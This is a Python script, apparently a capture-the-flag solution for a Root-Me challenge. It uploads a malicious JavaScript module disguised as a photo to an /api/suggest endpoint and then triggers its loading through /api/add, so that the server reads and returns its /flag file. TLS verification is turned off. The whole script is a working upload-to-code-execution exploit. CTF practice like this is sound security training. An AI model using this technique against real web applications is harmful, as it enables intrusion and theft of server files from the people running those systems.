import requests
import os

class CTFExploit:
    def __init__(self, base_url='https://day1.challenges.xmas.root-me.org'):
        self.base_url = base_url
        self.session = requests.Session()
        
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def create_malicious_module(self):
        """
        Create a malicious module that reads the flag
        """
        # Payload module content
        payload_content = '''
module.exports = {
    modelName: 'FlagReader',
    schema: { obj: { description: { default: 'Flag Reader' } } },
    store: function() {
        const fs = require('fs');
        return fs.readFileSync('/flag', 'utf-8');
    }
};
'''
        return payload_content

    def exploit(self):
        """
        Attempt to exploit by creating and loading a malicious module
        """
        try:
            # Create payload
            payload_content = self.create_malicious_module()
            
            # Prepare files for upload
            files = {
                'photo': ('flagreader.js', payload_content.encode()),
                'name': (None, 'flagreader')
            }
            
            # Upload the malicious module
            upload_response = self.session.post(
                f'{self.base_url}/api/suggest', 
                files=files,
                verify=False
            )
            
            print("Module Upload Response:")
            print(f"Status: {upload_response.status_code}")
            print(f"Content: {upload_response.json()}")
            
            # Try to load the uploaded module
            load_response = self.session.post(
                f'{self.base_url}/api/add', 
                json={'product': 'flagreader'},
                verify=False
            )
            
            print("\nModule Loading Attempt:")
            print(f"Status: {load_response.status_code}")
            print(f"Content: {load_response.json()}")
        
        except Exception as e:
            print(f"Error in exploitation: {e}")

def main():
    print("### CTF Flag Reading Exploit ###")
    exploit = CTFExploit()
    exploit.exploit()

if __name__ == '__main__':
    main()